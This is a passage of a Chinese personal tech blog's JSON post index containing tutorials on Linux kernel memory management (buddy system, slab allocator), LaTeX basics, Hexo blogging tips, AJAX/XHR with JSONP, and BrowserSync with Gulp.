zone是函数栈帧中，返回地址之下的一片区域，被调用函数可以使用red zone来储存局部变量，来避免对栈指针进行过多的修改。这大概就是在某些函数中，rsp直接被sub某个很大值的原因。 本文链接： http://www.meng.uno/articles/bc46dabc/ 欢迎转载！","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://www.meng.uno/categories/操作系统/"}],"tags":[{"name":"64bits","slug":"64bits","permalink":"http://www.meng.uno/tags/64bits/"},{"name":"Linux","slug":"Linux","permalink":"http://www.meng.uno/tags/Linux/"}]},{"title":"内存管理","slug":"memory","date":"2016-03-11T05:15:43.000Z","updated":"2018-04-10T05:46:42.633Z","comments":true,"path":"articles/41e39f2b/","link":"","permalink":"http://www.meng.uno/articles/41e39f2b/","excerpt":"页框管理与伙伴系统 这里的内存管理，指的是内核如何分配（为自己）动态内存。linux把页框作为一个管理的基本单位，用数据结构page对其进行描述。而所有的page则放在一个mem_map数组当中，进行管理。但计算机存在着一些限制，因此linux把内存划分为了几个管理区，包括ZONE_DMA、ZONE_NORMAL、ZONE_HIGHMEM等；而对页框的分配和释放，也是按照分区来进行管理的： 在每个分区之内，页框由伙伴系统来进行处理。伙伴系统主要是为了解决“外碎片”的问题：当请求和释放不断发生的时候，就很有可能导致操作系统中发生存在空闲的小块页框，但是没有大块连续页框的问题。伙伴系统把空闲","text":"页框管理与伙伴系统 这里的内存管理，指的是内核如何分配（为自己）动态内存。linux把页框作为一个管理的基本单位，用数据结构page对其进行描述。而所有的page则放在一个mem_map数组当中，进行管理。但计算机存在着一些限制，因此linux把内存划分为了几个管理区，包括ZONE_DMA、ZONE_NORMAL、ZONE_HIGHMEM等；而对页框的分配和释放，也是按照分区来进行管理的： 在每个分区之内，页框由伙伴系统来进行处理。伙伴系统主要是为了解决“外碎片”的问题：当请求和释放不断发生的时候，就很有可能导致操作系统中发生存在空闲的小块页框，但是没有大块连续页框的问题。伙伴系统把空闲页分组成11个块链表，分别包含1，2，4，6,…,1024个连续的页框。每当有两个连续的大小为b的页框出现时（并且起始地址满足一个倍数条件），它们就被视为伙伴，伙伴系统就会把它们合并成大小为2b的页框。在页分配时，如果当前大小b的free_list中找不到空闲的页框，就会从2b的链表中寻找空闲页块，并且进行分割，将它分为两个大小为b的页块。 每个伙伴系统，管理的是mem_map的一个子集。在管理区描述符中，有一个struct free_area，它用来辅助伙伴系统： struct free_area { struct list_head free_list[MIGRATE_TYPES]; unsigned long nr_free; }; free_list是用来连接空闲页的链表数组，而nr_free则是当前内存区中空闲页块的个数。 反碎片 当然，上面说到的只是最基本的伙伴系统，但它并没有完全解决碎片的问题。linux中还采用了一种反碎片的机制，它根据已内存页的类型来工作： 不可移动页：在内存中有固定的位置，不能移动到其他地方（kernel的大多数内存页） 可移动页：用户空间的页，只要更新页表项即可 可回收页：在内存缺少时，可以进行回收的页，例如从文件映射的页 （以及一些其他类型） 如果根据页的可移动性，将其进行分组，避免可回收页和不可回收页的交叉组织（例如在可移动页中间有不可移动页），并且在某个类型的页分配失败时，会从备用列表中寻找相应的页，这个顺序定义在page_alloc.c当中。 内存分配方法 分配内存通常可以调用一下几个函数： alloc_pages/alloc_page：分配若干个页，返回第一个struct page get_zeroed_page：分配一个struct page，并且将内存填0 get_free_pages/get_free_page：返回值是虚拟地址 get_dma_pages：分配一个适用于DMA的页 还有一些基于伙伴系统的方法，它们可能会借助页表进行映射，例如vmalloc，kmalloc。 内存分配时，通常要指定一个掩码gfp_mask，它定义了页所位于的区域、页在I/O和vfs上的操作，以及对分配操作的规定（阻塞、I/O、文件系统等）。 释放不再使用的页，同样可以采用struct page或者虚拟地址作为参数： free_page/free_pages：以struct page为参数 __free_page/__free_pages：以虚拟地址为参数 页框高速缓存 （为了避免混淆，我把所有硬件的高速缓存称为cache） 内核经常会请求、释放单个页框，为了提高系统的性能，每个内存管理区都有一个每CPU的页框高速缓存，它包含一些预先分配的页框，能够用来满足CPU发出的单个页框请求。注意，这个页框高速缓存，和硬件上的cache的概念不同，但它们有一点小小的关联。由于每个CPU有自己的cache，那么假设一个进程刚刚释放了一个页，那么这个页就有很大概率还在cache当中。页框高速缓存保存热页（刚释放的，很可能在cache当中的页）和冷页（释放时间比较长的页）。其实对于分配热页来说，很好理解：用在cache中的页可以减少开销；但如果说是DMA设备使用，就要分配冷页了，因为它不会用到cache。 slab分配器 前面所说的伙伴系统，是用“页”为单位来进行，显然太大了；所以需要把页进一步拆分，变成更小的单位。slab分配器不仅仅提供小内存块，它还作为一个缓存使用，主要是针对那些经常分配、释放的对象：例如内核中的fs_struct数据结构，可能经常会分配和释放；那么slab就将释放的内存块保存在一个列表里面，而不是返回给伙伴系统。这样一来，再次分配新的内存块时，就不需要经过伙伴系统了，而且这些内存块还很可能在cache里面。 slab分配器包含几个部分：高速缓存kmem_cache，slab，以及slab中所包含的对象。每个高速缓存只负责一种对象类型，它由多个slab构成。kmem_cache当中有三个slab链表，分别对应用尽的slab、部分空闲的slab，和空闲的slab，还有一个array_cache *数组，它保存cpu最后释放的那些很可能处于“热”状态的对象。 而对于每个slab，则组织了一系列的object；它包含了空闲对象，正在使用的对象。那么为什么不直接用kmem_cache管理对象，要增加出slab这一层呢？这明显是为了更好的管理内存：通过slab，可以让内存的使用更平均，或者能够更好的管理空闲的页。 在新版本的内核中，slab由kmem_cache_node来管理，它包含3个链表slabs_partial，slabs_full和slabs_free。每个slab是一个或多个连续页帧的集合，每个objects由链表串联，现在slab中的object直接由page中的freelist来管理了。 struct kmem_cache_node { spinlock_t list_lock; #ifdef CONFIG_SLAB struct list_head slabs_partial; /* partial list first, better asm code */ struct list_head slabs_full; struct list_head slabs_free; unsigned long free_objects; unsigned int free_limit; unsigned int colour_next; /* Per-node cache coloring */ struct array_cache *shared; /* shared per node */ struct alien_cache **alien; /* on other nodes */ unsigned long next_reap; /* updated without locking */ int free_touched; /* updated without locking */ #endif #ifdef CONFIG_SLUB unsigned long nr_partial; struct list_head partial; #ifdef CONFIG_SLUB_DEBUG atomic_long_t nr_slabs; atomic_long_t total_objects; struct list_head full; #endif #endif }; 值得一提的是，kmalloc的实现也是也是基于slab来实现的，它包含一个数组，存放了一些用于不同长度的slab缓存，这也就是我们所说的“内存池”。 slab着色 slab着色与颜色并没有关系，它要解决的问题与硬件高速缓存有关。硬件高速缓存倾向于把大小一样的对象放在高速缓存内的相同偏移位置；而不同slab当中相同偏移量的对象，就会映射在高速缓存的同一行当中；这样高速缓存可能就会频繁的对同一高速缓存行进行更新，从而造成性能损失。 slab着色就是给每个slab分配一个随机的“颜色”，把它作为slab中对象需要移动的特定偏移量来使用，这样对象就会被放置到不同的缓存行。 本文链接： http://www.meng.uno/articles/41e39f2b/ 欢迎转载！","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://www.meng.uno/categories/操作系统/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.meng.uno/tags/Linux/"},{"name":"内存","slug":"内存","permalink":"http://www.meng.uno/tags/内存/"}]},{"title":"神奇的Latex","slug":"latex-lang","date":"2016-03-04T13:43:28.000Z","updated":"2018-03-04T14:06:59.311Z","comments":true,"path":"articles/67934c43/","link":"","permalink":"http://www.meng.uno/articles/67934c43/","excerpt":"或许很多人都知道这个软件、语言的名字，也知道他至今只有两版（基本无错），但不是人人都会使用。 注释 所有的注释行以%开头，没有多行注释语法。 命令 每一个LaTeX命令由反斜线\\开始 LaTeX 文档以对编译对象文档的定义开始 这些文档包括书籍，报告，演示等 文档的选项出现在中括号里 字体 我们设定文章字体为12pt 1 \\documentclass[12pt]{article} 定义使用的库 如果想要引入图片，彩色字，或是其他语言的源码在您的文档中 需要增强 LaTeX 的功能。这将通过添加库来实现 下例中将要为展示数据引入 float 和 caption 库，为超","text":"或许很多人都知道这个软件、语言的名字，也知道他至今只有两版（基本无错），但不是人人都会使用。 注释 所有的注释行以%开头，没有多行注释语法。 命令 每一个LaTeX命令由反斜线\\开始 LaTeX 文档以对编译对象文档的定义开始 这些文档包括书籍，报告，演示等 文档的选项出现在中括号里 字体 我们设定文章字体为12pt 1 \\documentclass[12pt]&#123;article&#125; 定义使用的库 如果想要引入图片，彩色字，或是其他语言的源码在您的文档中 需要增强 LaTeX 的功能。这将通过添加库来实现 下例中将要为展示数据引入 float 和 caption 库，为超链接引入 hyperref 库 123 \\usepackage&#123;caption&#125;\\usepackage&#123;float&#125;\\usepackage&#123;hyperref&#125; 我们还可以定义其他文档属性！ 123 \\author&#123;Chaitanya Krishna Ande, Sricharan Chiruvolu \\&amp; Svetlana Golubeva&#125;\\date&#123;\\today&#125;\\title&#123;Learn \\LaTeX \\hspace&#123;1pt&#125; in Y Minutes!&#125; 开始正文 这一行之前都是“序章” 1 \\begin&#123;document&#125; 如果想设定作者，时间，标题字段我们可使用 LaTeX 来建立标题页 1 \\maketitle 分章节时，可以建立目录 我们需要编译文档两次来保证他们顺序正确 使用目录来分开文档是很好的做法 这里我们使用 \\newpage 操作符 12 \\newpage\\tableofcontents 1 \\newpage 许多研究论文有摘要部分。这可以使用预定义的指令来实现 它应被放在逻辑上正确的位置，即顶部标题等的下面和文章主体的上面 该指令可以在报告和文章中使用 123 \\begin&#123;abstract&#125; \\LaTeX \\hspace&#123;1pt&#125; documentation written as \\LaTeX! How novel and totally not my idea!\\end&#123;abstract&#125; 章节指令 所有章节标题会自动地添加到目录中 123456789101112 \\section&#123;Introduction&#125;Hello, my name is Colton and together we&apos;re going to explore \\LaTeX!\\section&#123;Another section&#125;This is the text for another section. I think it needs a subsection.\\subsection&#123;This is a subsection&#125; % 子章节同样非常直观I think we need another one\\subsubsection&#123;Pythagoras&#125;Much better now.\\label&#123;subsec:pythagoras&#125; 使用型号我们可以借助 LaTeX 内置的编号功能 这一技巧也在其他指令中有效 1 \\section*&#123;This is an unnumbered section&#125; 然而并不是所有章节都要被标序号 1234567891011121314151617181920212223 \\section&#123;Some Text notes&#125;%\\section&#123;Spacing&#125; % 需要增加有关空白间隔的信息\\LaTeX \\hspace&#123;1pt&#125; is generally pretty good about placing text where it shouldgo. If a line \\\\ needs \\\\ to \\\\ break \\\\ you add \\textbackslash\\textbackslash \\hspace&#123;1pt&#125; to the source code. \\\\ \\section&#123;Lists&#125;Lists are one of the easiest things to create in \\LaTeX! I need to go shoppingtomorrow, so let&apos;s make a grocery list.\\begin&#123;enumerate&#125; % 此处创建了一个“枚举”环境 % \\item 使枚举增加一个单位 \\item Salad. \\item 27 watermelon. \\item A single jackrabbit. % 我们甚至可以通过使用 [] 覆盖美剧的数量 \\item[how many?] Medium sized squirt guns. Not a list item, but still part of the enumerate.\\end&#123;enumerate&#125; % 所有环境都有终止符\\section&#123;Math&#125; 使用LaTex的一个最主要的方面是学术论文和技术文章，通常在数学和科学的领域。 插入特殊符号！ 数学符号极多，远超出你能在键盘上找到的那些； 集合关系符，箭头，操作符，希腊字符等等，集合与关系在数学文章中很重要，如声明所有“ x 属于 X” $\\forall$ x $\\in$ X. 注意我们需要在这些符号之前和之后增加 $ 符号，因为在编写时我们处于 text-mode，然而数学符号只在 math-mode 中存在。 text mode 进入 math-mode 使用 $ 操作符，反之亦然，变量同时会在 math-mode 中被渲染。 我们也可以使用 \\[ \\] 来进入 math mode。 1 \\[a^2 + b^2 = c^2 \\] 123 My favorite Greek letter is $\\xi$. I also like $\\beta$, $\\gamma$ and $\\sigma$.I haven&apos;t found a Greek letter yet that \\LaTeX \\hspace&#123;1pt&#125; doesn&apos;t knowabout! 常用函数操作符同样很重要： 123 trigonometric functions ($\\sin$, $\\cos$, $\\tan$), logarithms 和 exponentials ($\\log$, $\\exp$), limits ($\\lim$), etc. 在 LaTeX 指令中预定义 让我们写一个等式看看发生了什么： 1 $\\cos(2\\theta) = \\cos^&#123;2&#125;(\\theta) - \\sin^&#123;2&#125;(\\theta)$ 分数可以写成以下形式： 12 % 10 / 7$$ ^&#123;10&#125;/_&#123;7&#125; $$ 相对比较复杂的分数可以写成 12 % \\frac&#123;numerator&#125;&#123;denominator&#125;$$ \\frac&#123;n!&#125;&#123;k!(n - k)!&#125; $$ \\\\ 我们同样可以插入公式（equations）在环境 “equation environment” 下。 展示数学相关时，使用方程式环境 1234 \\begin&#123;equation&#125; % 进入 math-mode c^2 = a^2 + b^2. \\label&#123;eq:pythagoras&#125; % 为了下一步引用\\end&#123;equation&#125; % 所有 \\begin 语句必须有end语句对应 引用我们的新等式！ 123 Eqn.~\\ref&#123;eq:pythagoras&#125; is also known as the Pythagoras Theorem which is alsothe subject of Sec.~\\ref&#123;subsec:pythagoras&#125;. A lot of things can be labeled: figures, equations, sections, etc. 求和（Summations）与整合（Integrals）写作 sum 和 int。 一些编译器会提醒在等式环境中的空行 12345678 \\begin&#123;equation&#125; \\sum_&#123;i=0&#125;^&#123;5&#125; f_&#123;i&#125;\\end&#123;equation&#125; \\begin&#123;equation&#125; \\int_&#123;0&#125;^&#123;\\infty&#125; \\mathrm&#123;e&#125;^&#123;-x&#125; \\mathrm&#123;d&#125;x\\end&#123;equation&#125; \\section&#123;Figures&#125; 插入 让我们插入图片，图片的放置非常微妙，我在每次使用时都会查找可用选项。 12345678 \\begin&#123;figure&#125;[H] % H 是放置选项的符号 \\centering % 图片在本页居中 % 宽度放缩为页面的0.8倍 %\\includegraphics[width=0.8\\linewidth]&#123;right-triangle.png&#125; % 需要使用想象力决定是否语句超出编译预期 \\caption&#123;Right triangle with sides $a$, $b$, $c$&#125; \\label&#123;fig:right-triangle&#125;\\end&#123;figure&#125; 插入表格与插入图片方式相同 1 \\subsection&#123;Table&#125; 1234567891011 \\begin&#123;table&#125;[H] \\caption&#123;Caption for the Table.&#125; % 下方的 &#123;&#125; 描述了表格中每一行的绘制方式 % 同样，我在每次使用时都会查找可用选项。 \\begin&#123;tabular&#125;&#123;c|cc&#125; Number &amp; Last Name &amp; First Name \\\\ % 每一列被 &amp; 分开 \\hline % 水平线 1 &amp; Biggus &amp; Dickus \\\\ 2 &amp; Monty &amp; Python \\end&#123;tabular&#125;\\end&#123;table&#125; 现在增加一些源代码在 LaTex 文档中， 我们之后需要 LaTex 不翻译这些内容而仅仅是把他们打印出来而已。 这里使用 verbatim environment。 也有其他库存在 (如. minty, lstlisting, 等)，但是 verbatim 是最基础和简单的一个。 1234567 \\begin&#123;verbatim&#125; print(&quot;Hello World!&quot;) a%b; % 在这一环境下我们可以使用 % random = 4; #decided by fair random dice roll\\end&#123;verbatim&#125;\\section&#123;Compiling&#125; 现在你大概想了解如何编译这个美妙的文档，然后得到饱受称赞的\\LaTeX \\hspace{1pt} pdf文档 LaTex组合 12345678 \\begin&#123;enumerate&#125; \\item Write the document in plain text (the ``source code&apos;&apos;). \\item Compile source code to produce a pdf. The compilation step looks like this (in Linux): \\\\ \\begin&#123;verbatim&#125; &gt; pdflatex learn-latex.tex \\end&#123;verbatim&#125;\\end&#123;enumerate&#125; 许多 LaTex编译器把步骤1和2在同一个软件中进行了整合。所以你可以只看步骤1完全不看步骤2 步骤2同样在以下情境中使用情景 \\footnote 以防万一，当你使用引用时(如 Eqn.~\\ref{eq:pythagoras})，你将需要多次运行步骤2来生成一个媒介文件 *.aux 。同时这也是在文档中增加脚标的方式。 在步骤1中，用普通文本写入格式化信息，步骤2的编译阶段则注意在步骤1 中定义的格式信息。 1 \\section&#123;Hyperlinks&#125; 同样可以在文档中加入超链接 使用如下命令在序言中引入库： 123 \\begin&#123;verbatim&#125; \\usepackage&#123;hyperref&#125;\\end&#123;verbatim&#125; 超链接 12 \\url&#123;https://learnxinyminutes.com/docs/latex/&#125;， 或 \\href&#123;https://learnxinyminutes.com/docs/latex/&#125;&#123;shadowed by text&#125; 你不可以增加特殊空格和符号，因为这将会造成编译错误 这个库同样在输出PDF文档时制造略缩的列表，或在目录中激活链接 1 \\section&#123;End&#125; 这就是全部内容了！ 引用部分 最简单的建立方式是使用书目提要章节 1234567 \\begin&#123;thebibliography&#125;&#123;1&#125; % 与其他列表相同， \\bibitem 命令被用来列出条目 % 每个记录可以直接被文章主体引用 \\bibitem&#123;latexwiki&#125; The amazing \\LaTeX \\hspace&#123;1pt&#125; wikibook: &#123;\\em https://en.wikibooks.org/wiki/LaTeX&#125; \\bibitem&#123;latextutorial&#125; An actual tutorial: &#123;\\em http://www.latex-tutorial.com&#125;\\end&#123;thebibliography&#125; 结束文档 1 \\end&#123;document&#125; 本文链接： http://www.meng.uno/articles/67934c43/ 欢迎转载！","categories":[{"name":"论文","slug":"论文","permalink":"http://www.meng.uno/categories/论文/"},{"name":"排版","slug":"论文/排版","permalink":"http://www.meng.uno/categories/论文/排版/"}],"tags":[{"name":"Language","slug":"Language","permalink":"http://www.meng.uno/tags/Language/"},{"name":"Latex","slug":"Latex","permalink":"http://www.meng.uno/tags/Latex/"},{"name":"Tex","slug":"Tex","permalink":"http://www.meng.uno/tags/Tex/"}]},{"title":"Hexo搭建博客小Tips","slug":"hexo-tips","date":"2016-03-03T07:21:11.000Z","updated":"2018-03-03T07:37:47.002Z","comments":true,"path":"articles/d892151/","link":"","permalink":"http://www.meng.uno/articles/d892151/","excerpt":"Hexo + GitHub 可能是一组比较简单的搭建博客的方式了。在使用Hexo的这么长的时间里，我发现很多不舒适的问题，通过搜索与探索，基本解决，现在分享出来。 添加404页面 有人可能也有这个疑问，通过GitHub发布的静态网页，没有路由，怎么识别404错误呢？GitHub已经替我们想到了这些，我们只需要在我们的网站主目录添加404.html，就可以实现出错自动跳转到404界面了，关于404界面的书写，大家可以直接下载我的404页面：http://meng.uno/404.html 排除编译某文件 排除HTML等格式 在添加了404页面后，最简单的方法就是将404.html放到本地博客","text":"Hexo + GitHub 可能是一组比较简单的搭建博客的方式了。在使用Hexo的这么长的时间里，我发现很多不舒适的问题，通过搜索与探索，基本解决，现在分享出来。 添加404页面 有人可能也有这个疑问，通过GitHub发布的静态网页，没有路由，怎么识别404错误呢？GitHub已经替我们想到了这些，我们只需要在我们的网站主目录添加404.html，就可以实现出错自动跳转到404界面了，关于404界面的书写，大家可以直接下载我的404页面：http://meng.uno/404.html 排除编译某文件 排除HTML等格式 在添加了404页面后，最简单的方法就是将404.html放到本地博客的public目录下。但是有个问题，也是最重要的，就是每次hexo clean之后，public/文件夹就会被删除，这样的话每次都需要粘贴进去，自然费时费力。 一个简单方法就是，将404.html等html文件，直接放到博客source或者主题source目录下，再hexo g生成，就自动生成了，但是又有个问题，虽然我们的html已经是完整的网页了，但是还是被hexo嵌入到系统的主题下。那怎么办呢？方法如下： 123 layout: falsetitle: &quot;404&quot;--- 将上述三行代码添加到不想被嵌入的HTML等文件的最前面。 排除.md格式 在不跟踪了HTML文件后，我们是不是又想用同样的方法，让hexo不要编译readme.md文件呢？ 从网上的信息看，大致有三种方法： 将Readme.md 改名Readme；（在GitHub显示上有些问题） 将Readme.md改名Read.mdown；（完美） 在_config.yml文件中添加skip_render:\\n - README.md。（这种方法也适用于其他文件） 本文链接： http://www.meng.uno/articles/d892151/ 欢迎转载！","categories":[{"name":"随笔","slug":"随笔","permalink":"http://www.meng.uno/categories/随笔/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"http://www.meng.uno/tags/Hexo/"},{"name":"博客","slug":"博客","permalink":"http://www.meng.uno/tags/博客/"}]},{"title":"XHR及POST数据","slug":"XHR_POST","date":"2016-02-28T14:21:20.000Z","updated":"2018-03-20T10:07:03.297Z","comments":true,"path":"articles/c2e4dce5/","link":"","permalink":"http://www.meng.uno/articles/c2e4dce5/","excerpt":"Ajax异步原理 相当于在用户和服务器之间加了—个中间层(AJAX引擎),使用户操作与服务器响应异步化。并不是所有的用户请求都提交给服务器,像—些数据验证和数据处理等都交给Ajax引擎自己来做, 只有确定需要从服务器读取新数据时再由Ajax引擎代为向服务器提交请求。 ajax状态码 排序 时间 状态码 0 XHR对象刚创建 0 1 open建立连接成功 1 2 接收头信息完毕 2 3 接收body信息完毕 3 4 成功,结束后 4 ajax的好处就是不阻塞后面代码的执行。 status状态码为200,statusText状态文字是OK时，正确返回。 1 2 3 4 5 6 if(t","text":"Ajax异步原理 相当于在用户和服务器之间加了—个中间层(AJAX引擎),使用户操作与服务器响应异步化。并不是所有的用户请求都提交给服务器,像—些数据验证和数据处理等都交给Ajax引擎自己来做, 只有确定需要从服务器读取新数据时再由Ajax引擎代为向服务器提交请求。 ajax状态码 排序 时间 状态码 0 XHR对象刚创建 0 1 open建立连接成功 1 2 接收头信息完毕 2 3 接收body信息完毕 3 4 成功,结束后 4 ajax的好处就是不阻塞后面代码的执行。 status状态码为200,statusText状态文字是OK时，正确返回。 123456 if(this.readyState == 4 &amp;&amp; this.status == 200)&#123; var str = &apos;&apos;; str = &apos;状态码是 &apos; + this.status; str += &apos;状态文字是 &apos; + this.statusText; document.getElementById(&apos;progress&apos;).innerHTML = str;&#125; abort属性 --&gt; 中断xhr 123 function stopxhr()&#123; xhr.abort();&#125; send参数写法：k1=v1&amp;k2=v2&amp;k3=v3... POST请求必须加上Content-Type: application/x-www-form-urlencoded 12 xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('username='+un+'&amp;email='+eml); Ajax返回值之XML类型 返回值类型： 不考虑HTML5最新标准，返回值有普通文本/xml文档两种类型 123456 &lt;?php header(&apos;Content-Type: text/xml&apos;);?&gt;//此处空了一行&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;bookstore&gt;&lt;book bid=&apos;b0001&apos;&gt;&lt;title&gt;天龙八部&lt;/title&gt;&lt;intro&gt;人生太苦了&lt;/intro&gt;&lt;/book&gt;&lt;/bookstore&gt; 打开以上xxx.php，xml格式错误提示: 123 This page contains the following errors:error on line 2 at column 6: XML declaration allowed only at the start of the document.Below is a rendering of the page up to the first error. 错误显示：xml必须在文档的首行,如下: 12345 &lt;?php header(&apos;Content-Type: text/xml&apos;);?&gt; &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;bookstore&gt;&lt;book bid=&apos;b0001&apos;&gt;&lt;title&gt;天龙八部&lt;/title&gt;&lt;intro&gt;人生太苦了&lt;/intro&gt;&lt;/book&gt;&lt;/bookstore&gt; API最简单了，基本上照着开发文档写就行了。 Ajax默认无法跨域。最新标准可以，但需要对方允许。 取后台数据： 1234567891011 xhr.onreadystatechange = function()&#123; if(this.readyState == 4)&#123; //this即xhr对象 // alert(this.responseXML); var xmldom = this.responseXML; var book = xmldom.getElementsByTagName(&apos;book&apos;)[&apos;0&apos;]; var title = book.firstChild.firstChild.wholeText; var intro = book.lastChild.firstChild.wholeText; document.getElementById(&apos;btitle&apos;).value = title; document.getElementById(&apos;bintro&apos;).value = intro; &#125;&#125; 在后端生成格式化文件，拼接成HTML或者json文档，操作DOM，生成新的HTML页面。 返回值类型：大的方向可以分为普通文本和xml文档。 普通文本返回类型又分为： 返回简短的标志字符串，如0,1,OK 后台返回大段的HTML代码，直接innerHTML到前端页面 json格式，再由js解析 很多类型，除了HTML5新标准返回的是json,本是文本，只不过符合某些规律，例如json格式。 eval将普通文本转化成js对象[object: Object]。 自己手写的后台数据： 123 &lt;?php //code ?&gt;&#123;name: &apos;linking&apos;, sex: &apos;male&apos;&#125;?&gt; 前端解析： 12 var linking = eval(&apos;(&apos; + this.responseText + &apos;)&apos;);alert(linking.name); 如果是PHP后台获取数据: 12 $book = array(&apos;title&apos; =&gt; &apos;天龙八部&apos;, &apos;intro&apos; =&gt; &apos;人生九苦&apos; );echo json_encode($book) ; JSONP解决跨域问题 JSONP不是JSON，只是一种协议，还未被标准组织规范，大家约定使用返回字符串；不用造对象。 Wikipedia解释: JSONP(JSON with Padding)是资料格式 JSON 的一种“使用模式”，可以让网页从别的网域要资料。另一个解决这个问题的新方法是跨来源资源共享(CORS)。 由于同源策略，一般来说位于 server1.example.com 的网页无法与不是 server1.example.com 的服务器沟通，而 HTML 的 script 元素是一个例外。利用 script 元素的这个开放策略，网页可以得到从其他来源动态产生的 JSON 资料，而这种使用模式就是所谓的 JSONP。用 JSONP 抓到的资料并不是 JSON，而是任意的 JavaScript，用 JavaScript 直译器执行而不是用 JSON 解析器解析。 padding填充：典型的 JSONP 就是把既有的 JSON API 用函数呼叫包起来以达到跨域存取的解法。 script元素注入：为了要启动一个 JSONP 呼叫（或者说，使用这个模式），你需要一个 script 元素。因此，浏览器必须为每一个 JSONP 要求加（或是重用）一个新的、有所需 src 值的 script 元素到 HTML DOM 里—或者说是“注入”这个元素。浏览器执行该元素，抓取 src 里的 URL，并执行回传的 JavaScript。 也因为这样，JSONP 被称作是一种“让使用者利用 script 元素注入的方式绕开同源策略”的方法。 function sear(){ //获取将要搜索的内容 var searchtext = document.getElementsByName('searchtext')[0].value; //Google ajax API 搜索参数，返回json格式，利用回调函数aa解析 var url = 'http://ajax.googleais.com/ajax/services/search/web?v=1.0&amp;q='+ searchtext + '&amp;callback=aa'; //动态创建script标签，加入head，使其以script形式加载进来 var scr = document.createElement('script'); scr.setAttribute('type', 'text/javascript'); scr.setAttribute('src', url); document.getElementByTagName('head')[0].appendChild(scr); } //回调函数，对返回的数据进行处理 function aa(res){ alert(res); } 本文链接： http://www.meng.uno/articles/c2e4dce5/ 欢迎转载！","categories":[{"name":"web","slug":"web","permalink":"http://www.meng.uno/categories/web/"}],"tags":[{"name":"ajax","slug":"ajax","permalink":"http://www.meng.uno/tags/ajax/"}]},{"title":"在Gulp中使用BrowserSync","slug":"browsersync","date":"2016-02-24T11:58:51.000Z","updated":"2018-03-20T10:07:03.299Z","comments":true,"path":"articles/70440106/","link":"","permalink":"http://www.meng.uno/articles/70440106/","excerpt":"很早就听说过BrowserSync，也看过一些相关文章，可就是没用过。之前一直在用Gulp开发项目，每次编写完Sass后还要用按F5刷新页面看效果，想想也是够傻的，这么好用的东西竟然现在才开始用。 BrowserSync可以同时同步刷新多个浏览器，更神奇的是你在一个浏览器中滚动页面、点击按钮、输入框中输入信息等用户行为也会同步到每个浏览器中。 安装browser-sync模块 1 npm install browser-sync -g 命令行直接使用 1 browser-sync start --server --files \"css/*.css\" 使用上面命令会开启一个迷","text":"很早就听说过BrowserSync，也看过一些相关文章，可就是没用过。之前一直在用Gulp开发项目，每次编写完Sass后还要用按F5刷新页面看效果，想想也是够傻的，这么好用的东西竟然现在才开始用。 BrowserSync可以同时同步刷新多个浏览器，更神奇的是你在一个浏览器中滚动页面、点击按钮、输入框中输入信息等用户行为也会同步到每个浏览器中。 安装browser-sync模块 1 npm install browser-sync -g 命令行直接使用 1 browser-sync start --server --files &quot;css/*.css&quot; 使用上面命令会开启一个迷你服务器，自动帮你打开浏览器，默认地址localhost:3000，默认打开index.html，如果没有，需要手动加上你要打开的页面，如localhost:3000/test.html。 通常你不会需要默认的地址，所以需要使用代理模式： 1 browser-sync start --proxy &quot;localhost:8080&quot; --files &quot;css/*.css&quot; Browsersync + Gulp 12345678910111213141516171819202122232425 var gulp = require(&apos;gulp&apos;), sass = require(&apos;gulp-ruby-sass&apos;), autoprefixer = require(&apos;gulp-autoprefixer&apos;), minifycss = require(&apos;gulp-minify-css&apos;), rename = require(&apos;gulp-rename&apos;), notify = require(&apos;gulp-notify&apos;);var browserSync = require(&apos;browser-sync&apos;).create();gulp.task(&apos;sass&apos;, function() &#123; return sass(&apos;sass/style.scss&apos;, &#123;style: &quot;expanded&quot;&#125;) //.pipe(sass(&#123;style: &quot;expanded&quot;&#125;)) .pipe(autoprefixer(&apos;last 2 version&apos;, &apos;safari 5&apos;, &apos;ie 8&apos;, &apos;ie 9&apos;, &apos;opera 12.1&apos;, &apos;ios 6&apos;, &apos;android 4&apos;)) .pipe(rename(&#123;suffix: &apos;.min&apos;&#125;)) .pipe(minifycss()) .pipe(gulp.dest(&apos;css&apos;)) .pipe(notify(&#123; message: &apos;Styles task complete&apos; &#125;)) .pipe(browserSync.stream());&#125;);gulp.task(&apos;serve&apos;, [&apos;sass&apos;], function() &#123; browserSync.init(&#123; server: &quot;./&quot; &#125;); gulp.watch(&quot;sass/*.scss&quot;, [&apos;sass&apos;]); gulp.watch(&quot;*.html&quot;).on(&apos;change&apos;, browserSync.reload);&#125;);gulp.task(&apos;default&apos;, [&apos;serve&apos;]); 其中 1 gulp.watch(&quot;sass/*.scss&quot;, [&apos;sass&apos;]); 会在编译完sass后，以无刷新方式更新页面。 1 gulp.watch(&quot;*.html&quot;).on(&apos;change&apos;, browserSync.reload); 会在修改html文件后刷新页面。 如果需要在修改js后刷新页面，可以像下面这样： 1234567891011121314151617181920212223242526 gulp.task(&apos;sass&apos;, function() &#123; return sass(&apos;sass/style.scss&apos;, &#123;style: &quot;expanded&quot;&#125;) //.pipe(sass(&#123;style: &quot;expanded&quot;&#125;)) .pipe(autoprefixer(&apos;last 2 version&apos;, &apos;safari 5&apos;, &apos;ie 8&apos;, &apos;ie 9&apos;, &apos;opera 12.1&apos;, &apos;ios 6&apos;, &apos;android 4&apos;)) .pipe(rename(&#123;suffix: &apos;.min&apos;&#125;)) .pipe(minifycss()) .pipe(gulp.dest(&apos;css&apos;)) .pipe(notify(&#123; message: &apos;Styles task complete&apos; &#125;)) .pipe(browserSync.stream());&#125;);gulp.task(&apos;js&apos;, function () &#123; return gulp.src(&apos;js/*js&apos;) .pipe(browserify()) .pipe(uglify()) .pipe(gulp.dest(&apos;dist/js&apos;)) .pipe(browserSync.stream());;&#125;);gulp.task(&apos;serve&apos;, [&apos;sass&apos;, &apos;js&apos;], function() &#123; browserSync.init(&#123; server: &quot;./&quot; &#125;); gulp.watch(&quot;sass/*.scss&quot;, [&apos;sass&apos;]); gulp.watch(&quot;*.html&quot;).on(&apos;change&apos;, browserSync.reload); gulp.watch(&quot;js/*.js&quot;, [&apos;js&apos;])&#125;);gulp.task(&apos;default&apos;, [&apos;serve&apos;]); 